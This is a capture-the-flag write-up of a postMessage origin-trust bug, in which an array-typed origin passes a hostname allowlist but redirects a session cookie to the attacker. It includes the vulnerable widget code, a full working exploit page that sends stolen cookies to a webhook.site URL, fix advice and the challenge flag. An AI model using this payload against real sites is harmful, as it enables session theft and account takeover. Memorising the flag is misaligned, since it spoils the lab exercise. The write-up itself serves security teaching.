# Portway postMessage Origin Trust Session Leak

## What Is Happening

The Portway lab offers a session-handoff widget that partner apps embed to receive session data via `postMessage`. Users report suspicious partner URLs; a reviewer opens the URL in a fresh authenticated session.

The handoff widget at `/embed/handoff` trusts an attacker-controlled `origin` field inside the message body. A type-confusion bypass lets the attacker pass hostname validation while redirecting the reply to their own origin.

## Why It Happens

The live widget contains:

```javascript
let SECRET = document.cookie
let ALLOWED_ORIGINS = ["pwnbox.io"]
window.onmessage = (m) => {
    let origin = m.data.origin
    let host = new URL(origin).hostname;
    if (ALLOWED_ORIGINS.includes(host)) {
        window.parent.postMessage(SECRET, origin);
    }
}
```

Two bugs combine:

1. It validates `m.data.origin`, not the browser-supplied `m.origin`.
2. Validation and delivery interpret `origin` differently when it is an array:
   - `new URL(["https://pwnbox.io"])` stringifies the array to `"https://pwnbox.io"` → hostname `pwnbox.io` passes the allowlist.
   - `postMessage(SECRET, origin)` treats the array as `WindowPostMessageOptions` and reads `origin.targetOrigin` as the real delivery target.

## Exact Test

Use an attacker-controlled partner page that:

1. embeds `/embed/handoff` in an iframe (widget replies to `window.parent`, not `window.opener`)
2. repeatedly sends a forged message with an array origin and attacker `targetOrigin`
3. listens for the reply and exfiltrates `e.data`

Minimal payload:

```html
<!DOCTYPE html>
<iframe id="iframe" src="https://[target]/embed/handoff"></iframe>
<script>
const webhook = 'https://webhook.site/[uuid]';

window.addEventListener('message', (e) => {
  fetch(webhook + '?d=' + encodeURIComponent(e.data));
});

iframe.onload = () => {
  setInterval(() => {
    const origin = ['https://pwnbox.io'];
    origin.targetOrigin = location.origin;
    iframe.contentWindow.postMessage({ origin }, '*');
  }, 300);
};
</script>
```

Report the partner URL via `/report` while authenticated.

## Expected Signal

- `/embed/handoff` exposes the inline widget code.
- Local self-tests from a demo session may return an empty cookie in a third-party iframe.
- Reviewer-run exploit delivers a webhook callback containing the flag cookie.
- Empty `d=` callbacks still confirm the postMessage chain works; wait for the reviewer session.

## Result Interpretation

Confirmed bug chain:

```text
attacker partner page (parent)
-> iframe loads /embed/handoff in reviewer session
-> sends { origin: ["https://pwnbox.io"] with origin.targetOrigin = attacker }
-> new URL(origin) stringifies array -> allowlist passes
-> postMessage reads origin.targetOrigin -> cookie sent to attacker parent
```

## Root Cause

The SDK uses attacker-controlled message data as the trust source and applies different type coercion rules in the validator (`URL` stringification) and the sink (`postMessage` options dictionary lookup on `targetOrigin`).

## Impact

- Leakage of the reviewer's session cookie
- Full break of the session-handoff trust boundary
- In real systems, likely account takeover or SSO session theft across partner integrations

## Fix

- Validate `m.origin`, not `m.data.origin`
- Require `targetOrigin` to be a string, never an object or array
- Parse and compare exact trusted origins
- Send narrow, signed handoff tokens rather than raw cookies
- Bind replies to the expected sender window and one-time nonce

## Key Lesson

`postMessage` already provides the sender via `event.origin`. If validation stringifies attacker input but the sink treats it as an options object, `targetOrigin` becomes a second attacker-controlled channel.

## Flag

`pwnbox{58d6a8988b9152addf08b7046711fef8}`
